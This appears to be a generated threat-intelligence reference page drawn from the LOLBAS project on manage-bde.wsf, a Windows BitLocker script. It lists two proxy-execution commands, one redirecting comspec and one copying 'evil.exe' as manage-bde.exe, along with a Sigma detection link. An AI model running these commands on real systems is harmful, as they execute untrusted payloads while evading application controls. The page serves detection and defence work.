---
title: "Manage-bde.wsf"
framework: "lolbas"
generated: "true"
source_path: "yml/OSScripts/Manage-bde.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml"
build_date: "2026-04-27 18:39:01"
category: "OSScripts"
aliases:
  - "Manage-bde.wsf"
functions:
  - "Execute"
attack_technique_ids:
  - "T1216"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Manage-bde.wsf

Script for managing BitLocker

## Metadata

- Category: OSScripts
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSScripts/Manage-bde.yml

## Paths

- `C:\Windows\System32\manage-bde.wsf`

## Commands

### 1. Execute

Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.

```cmd
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
```

- Use Case: Proxy execution from script
- Privileges: User
- Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1216-system_script_proxy_execution|T1216]]

### 2. Execute

Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.

```cmd
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
```

- Use Case: Proxy execution from script
- Privileges: User
- Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1216-system_script_proxy_execution|T1216]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml
- IOC: Manage-bde.wsf should not be invoked by a standard user under normal situations

## Resources

- {'Link': 'https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712'}
- {'Link': 'https://twitter.com/bohops/status/980659399495741441'}
- {'Link': 'https://twitter.com/JohnLaTwC/status/1223292479270600706'}

## Acknowledgements

- {'Person': 'Jimmy', 'Handle': '@bohops'}
- {'Person': 'Daniel Bohannon', 'Handle': '@danielbohannon'}
- {'Person': 'John Lambert', 'Handle': '@JohnLaTwC'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml)
